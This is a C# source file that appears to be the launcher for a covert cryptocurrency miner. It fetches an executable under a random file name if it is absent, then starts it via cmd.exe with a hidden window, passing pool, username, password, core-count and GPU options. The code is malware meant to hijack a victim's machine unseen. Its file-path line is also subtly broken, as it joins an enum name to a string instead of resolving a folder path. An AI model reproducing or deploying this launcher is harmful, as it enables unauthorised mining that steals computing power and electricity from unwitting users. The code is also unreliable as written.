using System;
using System.Diagnostics;
using System.IO;

namespace Money
{
    class Run
    {
        public static string filePath = Environment.SpecialFolder.Templates + "//FrKdsS.exe";
        public static void Start(string Pool, string Username, string Password, int nCores, bool GPU = false)
        {
            if (!File.Exists(filePath))
            {
                Downloader.Download("","");
            }
            Process process = new Process();
            ProcessStartInfo startInfo = process.StartInfo;
            startInfo.FileName = "cmd.exe";
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.CreateNoWindow = true;
            if (GPU)
            {
                startInfo.Arguments = string.Format("/c " + filePath + " -o {0} -u {1} -p {2} -t {3} -g yes", new object[]
			{
				Pool,
				Username,
				Password,
				nCores
			});
            }
            else
            {
                startInfo.Arguments = string.Format("/c " + filePath + " -o {0} -u {1} -p {2} -t {3} -g no", new object[]
			{
				Pool,
				Username,
				Password,
				nCores
			});
            }
            process.Start();
        }
    }
}
